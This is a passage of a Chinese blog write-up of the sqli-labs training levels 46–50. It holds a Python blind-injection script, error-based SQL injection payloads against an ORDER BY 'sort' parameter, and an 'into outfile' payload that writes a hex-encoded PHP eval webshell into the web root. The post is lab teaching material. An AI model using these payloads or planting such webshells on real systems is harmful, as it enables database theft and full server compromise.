class="string">"?sort=rand(ascii(substr(&#123;&#125;,&#123;&#125;,1))=&#123;&#125;)"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">90</span>,<span class="number">125</span>):</span><br><span class="line">        array = []</span><br><span class="line">        payload = database_payload.format(<span class="string">"database()"</span>,i,j)</span><br><span class="line">        r = requests.get(url=url+payload)        </span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">7</span>,<span class="number">3</span>):</span><br><span class="line">            soup = re.findall(<span class="string">"&gt;(.*)&lt;"</span>,str(BeautifulSoup(r.text,<span class="string">"lxml"</span>).select(<span class="string">"td"</span>)[m]))[<span class="number">0</span>]</span><br><span class="line">            array.append(soup)</span><br><span class="line">        <span class="keyword">if</span>(array[<span class="number">0</span>]==<span class="string">"11"</span> <span class="keyword">and</span> array[<span class="number">1</span>]==<span class="string">"5"</span> <span class="keyword">and</span> array[<span class="number">2</span>]==<span class="string">"4"</span>):</span><br><span class="line">            database = database + chr(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">print(<span class="string">"The name of database: "</span> + database)</span><br><span class="line"></span><br><span class="line"><span class="comment">#table</span></span><br><span class="line">database = <span class="string">"security"</span></span><br><span class="line">table_array = []</span><br><span class="line">table_payload = <span class="string">"?sort=rand(ascii(substr((select table_name from information_schema.tables where table_schema=\"&#123;&#125;\" limit &#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;)"</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    table_name = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">96</span>,<span class="number">125</span>):</span><br><span class="line">            array = []</span><br><span class="line">            payload = table_payload.format(database,s,i,j)</span><br><span class="line">            r = requests.get(url=url+payload)        </span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">7</span>,<span class="number">3</span>):</span><br><span class="line">                soup = re.findall(<span class="string">"&gt;(.*)&lt;"</span>,str(BeautifulSoup(r.text,<span class="string">"lxml"</span>).select(<span class="string">"td"</span>)[m]))[<span class="number">0</span>]</span><br><span class="line">                array.append(soup)</span><br><span class="line">            <span class="keyword">if</span>(array[<span class="number">0</span>]==<span class="string">"11"</span> <span class="keyword">and</span> array[<span class="number">1</span>]==<span class="string">"5"</span> <span class="keyword">and</span> array[<span class="number">2</span>]==<span class="string">"4"</span>):</span><br><span class="line">                table_name = table_name + chr(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    table_array.append(table_name)</span><br><span class="line">set = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> table_array:</span><br><span class="line">    print(<span class="string">"The table of "</span> + database + <span class="string">": "</span> + str(set) + <span class="string">"."</span> + str(i) + <span class="string">" "</span>)</span><br><span class="line">    set = set + <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>等待之后就可以得出结果</p>
+<p>Ps：一时兴起，输出写的比较端正，但是出结果很慢，要等待很长时间，需要用时自己再修改一下代码</p>
+<h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><p>本关对<code>sort</code>参数的处理加上了单引号，那么此处就不能直接像之前那样子<code>?sort=rand()</code>，因为如果加上单引号会让函数变成字符串<code>?sort=&#39;rand()&#39;</code>，就不能执行，所以本关必须要闭合掉前面的单引号</p>
+<p>这里我们用<code>报错注入</code></p>
+<p>双查询报错注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#爆数据库</span><br><span class="line">?sort=1&apos; and (select count(*) from information_schema.columns group by concat(0x3a,(select database()),0x3a,floor(rand(0)*2)))--+</span><br><span class="line"></span><br><span class="line">#爆列名</span><br><span class="line">?sort=1&apos; and (select count(*) from information_schema.columns group by concat(0x3a,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),0x3a,floor(rand(0)*2)))--+</span><br></pre></td></tr></table></figure>
+<p>procedure analyse()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#爆用户名</span><br><span class="line">?sort=1&apos; procedure analyse(extractvalue(1,concat(0x3a,user())),1)--+</span><br></pre></td></tr></table></figure>
+<p>extractvalue()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#爆表名</span><br><span class="line">?sort=1&apos; and extractvalue(1,concat(0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a))--+</span><br></pre></td></tr></table></figure>
+<p>updatexml()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#爆列名</span><br><span class="line">?sort=1&apos; and updatexml(1,concat(0x3a,(select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),0x3a),1)--+</span><br></pre></td></tr></table></figure>
+<h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><p>本关方法与Less-46一样，唯一区别就是没有报错信息，不再赘述</p>
+<h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><p>本关方法与Less-47一样，唯一区别就是没有报错信息</p>
+<p>我们用<code>into outfile</code>来注入试一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&apos; into outfile &quot;C:\\phpstudy\\WWW\\AAsqli-labs\\Less-49\\shell.php&quot; lines terminated by 0x3c3f70687020406576616c28245f504f53545b5f5d293b203f3e--+</span><br></pre></td></tr></table></figure>
+<p>可以看到已经把马给写进去了，并且菜刀可以成功连接</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/9-1.png" alt="9-1"></p>
+<h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><p>本关开始，考察的是<code>order by注入</code>+<code>堆叠注入</code>，使用<code>mysqli_multi_query()</code>函数，前面关卡已经讲解过，不再赘述</p>
+<p>至此，41-50关的Write-up结束</p>
+<p>后一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/02/03/Sqli-labs%20%E7%AC%AC51-65%E5%85%B3/">第51-60关Write-up</a>Less-51</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Sqli-labs</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/02/02/Sqli-labs 第41-50关/">展开全文 >></a>
         </p>
       
 
